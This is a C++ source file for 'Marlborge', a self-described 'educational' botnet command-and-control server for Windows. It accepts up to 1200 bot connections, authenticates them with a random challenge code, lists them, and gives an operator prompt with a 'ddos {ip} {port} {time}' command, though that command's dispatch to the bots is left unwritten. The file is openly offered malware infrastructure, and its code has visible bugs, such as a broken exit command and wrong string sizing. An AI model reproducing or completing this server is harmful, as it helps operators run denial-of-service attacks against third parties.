#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <iostream>
#include <Windows.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <thread>
#include <mutex>
#include <map>
#include <time.h>
#include <string>
#include <csignal>
#include <vector>

enum COMMAND {
	HELP = 0x01,
	DDOS = 0x02,
	CLIENTS = 0x03,
	CLEAR = 0x0F,
	EXIT = 0xFF,
	UNKNOWN = 0x00
};

void ListenThread();
void ClientThread(SOCKET sock, std::string ip);
void Disconnect(std::string ip);

void SIGINTHandler(int signal);

std::vector<std::string> split(std::string sData, char delimiter);

COMMAND GetCommand(std::string cmd);

std::string GenRandStr(int nLength);

std::map<std::string, SOCKET> clients;
std::mutex clientsMutex;

#define IP_ADDR "127.0.0.1"
#define PORT 5000
#define MAXCONN 1200

#define AUTH 0x01
#define ATTACK 0x02
#define DISCONNECT 0x10

int main() {
	WSADATA wsa;
	int nRes = WSAStartup(MAKEWORD(2, 2), &wsa);

	if (nRes != 0) {
		std::cout << "[ERROR] An error occurred during WSAStartup." << std::endl;
		throw std::exception();
		return 1;
	}

	std::thread listenThread(ListenThread);
	listenThread.detach();
	
	std::cout <<
		"  __  __            _ _                          \n"
		" |  \\/  |          | | |                         \n"
		" | \\  / | __ _ _ __| | |__   ___  _ __ __ _  ___ \n"
		" | |\\/| |/ _` | '__| | '_ \\ / _ \\| '__/ _` |/ _ \\ \n"
		" | |  | | (_| | |  | | |_) | (_) | | | (_| |  __/\n"
		" |_|  |_|\\__,_|_|  |_|_.__/ \\___/|_|  \\__, |\\___|\n"
		"                                       __/ |     \n"
		"                                      |___/      \n\n";

	std::cout << "Welcome to Marlborge" << std::endl;
	std::cout << "Made for educational purposes only" << std::endl;
	std::cout << std::endl << "Github: https://github.com/PR3C14D0/Marlborge" << std::endl;
	std::cout << std::endl << "Type `help` for displaying all the commands" << std::endl;

	std::signal(SIGINT, SIGINTHandler);

	while (true) {
		std::cout << "root@marlborge:~# ";
		std::string cmd;
		std::getline(std::cin, cmd);
		std::cout << std::endl;

		COMMAND command = GetCommand(cmd);

		UINT nClientCount = clients.size();
		switch (command) {
		case HELP:
			std::cout << "Marlborge command list:\n"
				"1.- ddos {ip} {port} {time}\n"
				"2.- clients\n";
			break;
		case CLIENTS:
			std::cout << "Connected clients: " << nClientCount << std::endl;
			break;
		case DDOS:
			{
				std::vector<std::string> splittedCmd = split(cmd, ' ');
				std::string ip = splittedCmd[1];
				std::string sPort = splittedCmd[2];
				std::string sTime = splittedCmd[3];

				int nPort = stoi(sPort);
				int nTime = stoi(sTime);
			}
			break;
		case CLEAR:
			std::cout << "\033[2J\033[1;1H" << std::endl;
			break;
		case EXIT:
			for (std::pair<std::string, SOCKET> client : clients) {
				Disconnect(client.first);
			}
			break;
		default:
			std::cout << "[ERROR] " << cmd << " is not a valid command" << std::endl;
			break;
		}
	}

	return 0;
}

void ListenThread() {
	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (sock == INVALID_SOCKET) {
		std::cout << "[ERROR] An error occurred with our server socket initialization" << std::endl;
		throw std::exception();
		return;
	}

	SOCKADDR_IN saIn = { };
	saIn.sin_family = AF_INET;
	saIn.sin_port = htons(PORT);
	inet_pton(AF_INET, IP_ADDR, &saIn.sin_addr.s_addr);

	int nRes = bind(sock, (SOCKADDR*)&saIn, sizeof(saIn));
	if (nRes == SOCKET_ERROR) {
		std::cout << "[ERROR] Error binding our server socket." << std::endl;
		throw std::exception();
		return;
	}
	
	nRes = listen(sock, MAXCONN);

	if (nRes == SOCKET_ERROR) {
		std::cout << "[ERROR] Error listening on our server socket." << std::endl;
		throw std::exception();
		return;
	}

	bool bQuit = false;
	while (!bQuit) {
		SOCKADDR_IN clientInfo;
		int clientInfoSize = sizeof(clientInfo);
		SOCKET client = accept(sock, (SOCKADDR*)&clientInfo, &clientInfoSize);
		char chIpBuff[INET_ADDRSTRLEN];
		inet_ntop(AF_INET, &clientInfo.sin_addr.s_addr, chIpBuff, INET_ADDRSTRLEN);

		std::string clientIp(chIpBuff);

		clientsMutex.lock();
		clients[clientIp] = client;
		clientsMutex.unlock();

		std::thread clientThread(ClientThread, client, clientIp);
		clientThread.detach();
	}
}

std::string GenRandStr(int nLength) {
	const std::string alphaNum =
		"0123456789"
		"abcdefghijklmnopqrstuvwxyz"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ";

	std::string randStr;
	std::srand(time(nullptr));
	for (int i = 0; i < nLength; i++) {
		int nRandNum = rand() % (sizeof(alphaNum) - 1);
		randStr += alphaNum[nRandNum];
	}

	return randStr;
}

COMMAND GetCommand(std::string cmd) {
	COMMAND command = UNKNOWN;
	cmd = split(cmd, ' ')[0];
	if (cmd == "help")
		command = HELP;

	if (cmd == "ddos")
		command = DDOS;

	if (cmd == "clients")
		command = CLIENTS;

	if (cmd == "clear")
		command = CLEAR;

	if (cmd == "exit")
		command = EXIT;

	return command;
}

void ClientThread(SOCKET sock, std::string ip) {
	/* AUTHENTICATION STAGE */
	char auth[1];
	recv(sock, auth, sizeof(auth), 0);

	if (auth[0] == AUTH) {
		std::string code = GenRandStr(16);
		char authBuff[1024];
		int nBuffSize = 0;
		authBuff[0] = AUTH;
		nBuffSize++;
		memcpy(&authBuff[nBuffSize], code.data(), code.size());
		nBuffSize += code.size();
		send(sock, authBuff, nBuffSize, 0);

		char respBuff[1024];
		int nRespSize = recv(sock, respBuff, sizeof(respBuff), 0);
		if (respBuff[0] != 0x01) 
			Disconnect(ip);

		std::string respCode;
		respCode.append(&respBuff[1], code.size());

		if (respCode != code)
			Disconnect(ip);
	}

	bool bConnected = true;
	while (bConnected) {
		char buffer[1];
		recv(sock, buffer, sizeof(buffer), 0);
		if ((UINT)buffer[0] == DISCONNECT) {
			Disconnect(ip);
			bConnected = false;
		}
	}

	return;
}

void Disconnect(std::string ip) {
	char quit[] = { DISCONNECT };
	SOCKET sock = clients[ip];
	send(sock, quit, sizeof(quit), 0);
	clientsMutex.lock();
	clients.erase(ip);
	closesocket(sock);
	clientsMutex.unlock();
	return;
}

std::vector<std::string> split(std::string sData, char delimiter) {
	std::vector<std::string> retStr;
	std::string actualStr;
	for (char c : sData) {
		if (c != delimiter) 
			actualStr += c;
		else {
			retStr.push_back(actualStr);
			actualStr = "";
		}
	}
	if (!actualStr.empty())
		retStr.push_back(actualStr);

	return retStr;
}

void SIGINTHandler(int signal) {
	
}